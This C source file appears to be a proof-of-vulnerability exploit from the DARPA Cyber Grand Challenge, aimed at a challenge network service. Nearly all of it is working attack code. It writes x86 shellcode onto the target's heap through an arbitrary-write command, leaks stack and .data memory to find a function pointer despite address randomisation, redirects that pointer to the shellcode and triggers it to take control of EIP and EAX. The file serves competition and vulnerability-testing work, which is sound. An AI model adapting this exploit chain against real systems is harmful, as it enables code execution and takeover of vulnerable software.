/*
 * Copyright (C) Narf Industries <info@narfindustries.com>
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included
 * in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
 * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
 * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
 * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 */
 
#include "pov.h"


/**
 * Reliably recv bytes.
 *
 * @param fd File descriptor where we will recv bytes.
 * @param buf Pointer to where we will write the bytes
 * @param size The amount of bytes to recv.
 * @return An int indicating SUCCESS (0) or an error condition (!=0).
 */
int recv_bytes(int fd, char *buf, unsigned int size) {

  int ret = SUCCESS;
  size_t bytes_left = size;
  size_t rx_bytes_local = 0;

  while (bytes_left) {

    rx_bytes_local = 0;

    if (SUCCESS != (ret = receive(STDIN, buf+(size-bytes_left), bytes_left, &rx_bytes_local))) {
       err("receive() call within recv_bytes() failed\n");
    }

    bytes_left -= rx_bytes_local;

    // Assume EOF if 0-lengthed buffer.
    if (0 == rx_bytes_local) {
      goto bail;
    }
  }

bail:
  return ret;
}

/**
 * Reliably send bytes.
 *
 * @param fd File descriptor to where we will send bytes.
 * @param buf Pointer to the bytes to send.
 * @param size The amount of bytes to send.
 * @return An int indicating SUCCESS (0) or an error condition (!=0).
 */
int send_bytes(int fd, const char *buf, unsigned int size) {

   int ret = SUCCESS;
   size_t bytes_left = size;
   size_t tx_bytes_local = 0;

   while (bytes_left) {

      tx_bytes_local = 0;

    if (SUCCESS != (ret = transmit(STDOUT, buf+(size-bytes_left), bytes_left, &tx_bytes_local))) {
         err("transmit() call within send_bytes() failed\n");
      }

      bytes_left -= tx_bytes_local;

      // Assume EOF if 0-lengthed buffer.
      if (0 == tx_bytes_local) {
         goto bail;
      }
   }

bail:
   return ret;
}


/** 
 * Type 1 shellcode. 
 * To be modified with negotiated value before sending to target.
 *
 * NOTE 1: GCC targeting x86 has no "naked" attribute :-/
 */
#define OFF_EAX 4 // due to prologue
#define OFF_EIP 9
void sc_type1(void) {
    __asm__("movl $0xCCCCCCCC, %eax\n"  // 0xCCCCCCCC-> regval
            "movl $0xDDDDDDDD, %ecx\n"  // 0xDDDDDDDD -> ipval
            "jmpl *%ecx\n");      
}


/**
 * Packet creation support function.
 *
 * @param pkt Pointer to the packet_t structure to populate
 * @param status The packet's status or ?_LAST
 * @param seq The packet's seq or MAGIC_RND
 * @param type The packet's type or ?_LAST
 * @param action The packet's action or ?_LAST
 * @param op2type The packet's op2type or ?_LAST
 * @param dst The packet's dst or ?_LAST
 * @param src The packet's src or ?_LAST
 * @return An int indicating SUCCESS (0) or an error condition (!=0).
 */
int new_pkt(packet_t *pkt, 
            status_t status, 
            uint32_t seq, 
            access_t type, 
            action_t action, 
            op2type_t op2type, 
            uint32_t dst, 
            uint32_t src) {

    int ret = SUCCESS;
    uint32_t randuint32_t = 0;

    // If a field is ?_LAST, randomize it. The only things we can't randomize:
    // status (because it's validated), type (because this determines handler).

    if (MAGIC_RND == seq) {
        CHK_SUCCESS(
            random(&randuint32_t, sizeof(randuint32_t), NULL), 
            "unable to generate random pkt member\n");
        seq = randuint32_t;
    }

    // status cannot be randomized

    if (A_LAST == action) {
        CHK_SUCCESS(
            random(&randuint32_t, sizeof(randuint32_t), NULL), 
            "unable to generate random pkt member\n");
        action = randuint32_t;
    }

    // type cannot be randomized

    if (OP2_LAST == op2type) {
        CHK_SUCCESS(
            random(&randuint32_t, sizeof(randuint32_t), NULL), 
            "unable to generate random pkt member\n");
        op2type = randuint32_t;
    }

    if (MAGIC_RND == src) {
        CHK_SUCCESS(
            random(&randuint32_t, sizeof(randuint32_t), NULL), 
            "unable to generate random pkt member\n");
        src = randuint32_t;
    }

    if (MAGIC_RND == dst) {
        CHK_SUCCESS(
            random(&randuint32_t, sizeof(randuint32_t), NULL), 
            "unable to generate random pkt member\n");
        dst = randuint32_t;
    }

    pkt->status = status;
    pkt->seq = seq;
    pkt->type = type;
    pkt->inst.action = action;
    pkt->inst.op2type = op2type;
    pkt->inst.dst = dst;
    pkt->inst.src = src;

bail:
    return ret;
}


/**
 * Send shellcode to target 4B at a time.
 *
 * @param sc Pointer to the shellcode.
 * @param loc VA on target that the shellcode will reside.
 * @return An int indicating SUCCESS (0) or an error condition (!=0).
 */
#define SZ_SC 0x100 // There is no way to determin len(func) in C, so we estimate.
int transmit_sc(byte_t *sc, uint32_t loc) {
    dbg("%s()\n", __func__);

    int ret = SUCCESS;
    packet_t req, resp;
    size_t idx = 0;

    while (idx < SZ_SC) {

        // Send shellcode 4B at a time.
        CHK_SUCCESS(
            new_pkt(&req, S_REQ, MAGIC_RND, X_SCRATCH, A_WRITE, OP2_IMM, (uint32_t)loc+idx, *(uint32_t *)&sc[idx]), 
            "unable to create packet\n");
        CHK_SUCCESS(
            send_bytes(STDOUT, (char *)&req, sizeof(packet_t)), 
            "failed to send packet\n");
        CHK_SUCCESS(
            recv_bytes(STDIN, (char *)&resp, sizeof(packet_t)), 
            "failed to recv additional bytes\n");

        idx += sizeof(uint32_t);
    }

bail:
    return ret;
}

/**
 * Leak a needle from the range [bgn, end], bookended by 
 * [magic_before, magic_after]; optionally dereference the needle.
 *
 * @param deref Boolean indicating whether we should dereference the needle on 
 *  target.
 * @param bgn First VA in search space.
 * @param end Last VA in search space. 
 * @param magic_before Bookend prior to needle.
 * @param magic_after Bookend after the needle.
 * @param assign Pointer to where the needle will be stored.
 * @return An int indicating SUCCESS (0) or an error condition (!=0).
 */
int find_needle(bool deref, uint32_t bgn, uint32_t end, uint32_t magic_before, uint32_t magic_after, uint32_t *assign) {
    dbg("%s()\n", __func__);

    int ret = SUCCESS;
    packet_t req, resp;
    size_t idx = 0;
    int found = 0;

    while (bgn+idx < end) {

        // Get 4B at bgn+idx
        CHK_SUCCESS(
            new_pkt(&req, S_REQ, MAGIC_RND, X_NORMAL, A_READ, OP2_MEM, MAGIC_RND, bgn+idx), 
            "unable to create packet\n");
        CHK_SUCCESS(
            send_bytes(STDOUT, (char *)&req, sizeof(packet_t)), 
            "failed to send packet\n");
        CHK_SUCCESS(
            recv_bytes(STDIN, (char *)&resp, sizeof(packet_t)), 
            "failed to recv response packet\n");

        // 4B put into resp.inst.dst

        if (magic_before == resp.inst.dst) {
            // We found before bookend...
            dbg("found 0x%08x @ 0x%08x\n", magic_before, bgn+idx);

            // .. check for after bookend.
            CHK_SUCCESS(
                new_pkt(&req, S_REQ, MAGIC_RND, X_NORMAL, A_READ, OP2_MEM, MAGIC_RND, bgn+idx+8), 
                "unable to create packet\n");
            CHK_SUCCESS(
                send_bytes(STDOUT, (char *)&req, sizeof(packet_t)), 
                "failed to send packet\n");
            CHK_SUCCESS(
                recv_bytes(STDIN, (char *)&resp, sizeof(packet_t)), 
                "failed to recv response packet\n");

            if (magic_after == resp.inst.dst) {
                // We found after bookend...
                dbg("found 0x%08x @ 0x%08x\n", magic_after, bgn+idx+8);

                if (deref) {
                    // If we're derefing the target, then do it.
                    dbg("deref'ing the target\n");

                    CHK_SUCCESS(
                        new_pkt(&req, S_REQ, MAGIC_RND, X_NORMAL, A_READ, OP2_MEM, MAGIC_RND, bgn+idx+4), 
                        "unable to create packet\n");
                    CHK_SUCCESS(
                        send_bytes(STDOUT, (char *)&req, sizeof(packet_t)), 
                        "failed to send packet\n");
                    CHK_SUCCESS(
                        recv_bytes(STDIN, (char *)&resp, sizeof(packet_t)), 
                        "failed to recv response packet\n");
                    *assign = resp.inst.dst; 

                } else {
                    // Otherwise we're done.
                    *assign = bgn+idx+4;
                }
                dbg("found needle: 0x%08x\n", *assign);
                goto bail;

            } else {
                err("failed to find 0x%08x\n", magic_after);
            }
        } else {
            //dbg("reading @ 0x%08x | did not find magic; 0x%08x != 0x%08x\n", bgn+idx, resp.inst.dst, magic_before);
        }
        idx += sizeof(uint32_t);
    }

    err("could not find needle\n");

bail:
    return ret;
}


/**
 * Locate the func_ptr by searching for a needle in .data.
 *
 * @return An int indicating SUCCESS (0) or an error condition (!=0).
 */
int find_func_ptr(void) {
    dbg("%s()\n", __func__);

    int ret = SUCCESS;

    CHK_SUCCESS(
        find_needle(
            FALSE, 
            t_data_bgn, t_data_end, 
            MAGIC_PTR_BEFORE, MAGIC_PTR_AFTER, 
            &t_func_ptr), 
        "couldn't find func ptr\n");

    dbg("t_func_ptr @ 0x%08x\n", t_func_ptr);

bail:
    return ret;
}


/**
 * Locate the .data segment by searching for a needle on the stack.
 *
 * @return An int indicating SUCCESS (0) or an error condition (!=0).
 */
int find_data(void) {
    dbg("%s()\n", __func__);

    int ret = SUCCESS;

    CHK_SUCCESS(
        find_needle(
            TRUE, 
            SRCH_DATA_BGN, STCK_END, 
            MAGIC_DATA_BEFORE, MAGIC_DATA_AFTER, 
            &t_data_bgn), 
        "couldn't find .data\n");

    // Round down for base.  Yeah, this is hacky.
    t_data_bgn &= 0xFFFFF000;
    t_data_end = t_data_bgn + SZ_DATA;
    dbg(".data base: 0x%08x\n", t_data_bgn);

bail:
    return ret;
}


/** 
 * High-level POV logic.
 *
 * @param leaked Pointer to a uint32_t.  The leaked 4B will be written here.
 * @return An int indicating SUCCESS (0) or an error condition (!=0).
 */
int doit(type1_vals *t1vals) {
    dbg("%s()\n", __func__);

    int ret = SUCCESS;
    packet_t req, resp;
    byte_t rnd_offset = 0;
    byte_t sc_buf[0x100];

    // Pick a location for our shellcode.  Yey for x86 byte alignment.
    CHK_SUCCESS(random(&rnd_offset, sizeof(rnd_offset), NULL), 
        "failed during random() for rnd_offset\n");
    t_sc = HEAP_BGN + rnd_offset;
    dbg("t_sc = 0x%08x\n", t_sc);

    // Read in shellcode, inject negotiated values for EAX and EIP.
    memcpy(sc_buf, &sc_type1, SZ_SC);
    sc_buf[OFF_EAX+0] = (t1vals->regval >>  0) & 0xFF;
    sc_buf[OFF_EAX+1] = (t1vals->regval >>  8) & 0xFF;
    sc_buf[OFF_EAX+2] = (t1vals->regval >> 16) & 0xFF;
    sc_buf[OFF_EAX+3] = (t1vals->regval >> 24) & 0xFF;
    sc_buf[OFF_EIP+0] = (t1vals->ipval >>  0) & 0xFF; 
    sc_buf[OFF_EIP+1] = (t1vals->ipval >>  8) & 0xFF; 
    sc_buf[OFF_EIP+2] = (t1vals->ipval >> 16) & 0xFF; 
    sc_buf[OFF_EIP+3] = (t1vals->ipval >> 24) & 0xFF; 

    // Place shellcode on target heap via X_SCRATCH command.
    CHK_SUCCESS(transmit_sc((byte_t *)&sc_buf, t_sc), 
        "failed placing shellcode in heap buffer\n");

    // We need to determine the location of a function pointer we can redirect 
    // to our shellcode.  One such function pointer is in the .data segment.  
    // Problem: the .data segment moves around across executions.  
    // Solution: there's a pointer to the .data section on the stack (and the 
    // stack does not move around).
    // Strategy:
    // - read the stack, look for magic bookends on pointer to .data
    // - discover the base address of .data
    CHK_SUCCESS(find_data(), "unable to determine .data address\n");
    // - read .data, look for magic bookends on func_ptr
    // - discover location of func_ptr
    CHK_SUCCESS(find_func_ptr(), "unable to locate func_ptr in .data\n");

    // Overwrite func_ptr, redirect to our shellcode.
    CHK_SUCCESS(
        new_pkt(&req, S_REQ, MAGIC_RND, X_NORMAL, A_WRITE, OP2_IMM, t_func_ptr, t_sc), 
        "unable to create packet\n");
    CHK_SUCCESS(
        send_bytes(STDOUT, (char *)&req, sizeof(packet_t)), 
        "failed to send packet\n");
    CHK_SUCCESS(
        recv_bytes(STDIN, (char *)&resp, sizeof(packet_t)), 
        "failed to recv response packet\n");
    dbg("pointed t_func_ptr (0x%08x) to t_sc (0x%08x)\n", t_func_ptr, t_sc);

    // We've redirected func_ptr to our shellcode.  Now we trigger shellcode 
    // execution by issuing an X_PREV request.
    CHK_SUCCESS(
        new_pkt(&req, S_REQ, MAGIC_RND, X_PREV, A_READ, OP2_IMM, MAGIC_RND, MAGIC_RND), 
        "unable to create packet\n");
    CHK_SUCCESS(
        send_bytes(STDOUT, (char *)&req, sizeof(packet_t)), 
        "failed to send packet\n");

bail:
    return ret;
}


/**
 * Negotiate Type 1 POV with infrastructure.
 *
 * @return Error status
 */
int main(void) {
    dbg("%s()\n", __func__);

    int ret = SUCCESS;
    type1_vals t1vals = { 0 };
    uint32_t mask_eip, mask_reg;

    // We need to hack around the fact that POV Type 1 negotiation might choose 
    // an EIP that falls within our .text segment.
    //.text: 0x08048000 - 0x08146000
    // We do this in a simple manner by masking off the most significant nibble 
    // and then always choosing a non-zero value for it.
    mask_eip = 0x0FFFFFFF;
    mask_reg = 0xFFFFFFFF;
    CHK_SUCCESS(
        type1_negotiate(mask_eip, mask_reg, REGNUM_EAX, &t1vals), 
        "unable to negotiate with CGC infrastructure\n");

    dbg("negotiated: EIP = (0x%08x & 0x%08x), EAX = (0x%08x & 0x%08x)\n", 
        t1vals.ipval, mask_eip, t1vals.regval, mask_reg);

    // Let's choose something non-zero for the most significant nibble.
    t1vals.ipval |= 0xF0000000; 

    dbg("actual: EIP = (0x%08x & 0x%08x), EAX = (0x%08x & 0x%08x)\n", 
        t1vals.ipval, mask_eip, t1vals.regval, mask_reg);

    // All actual work done here.
    doit(&t1vals);

bail:
    return ret;
}

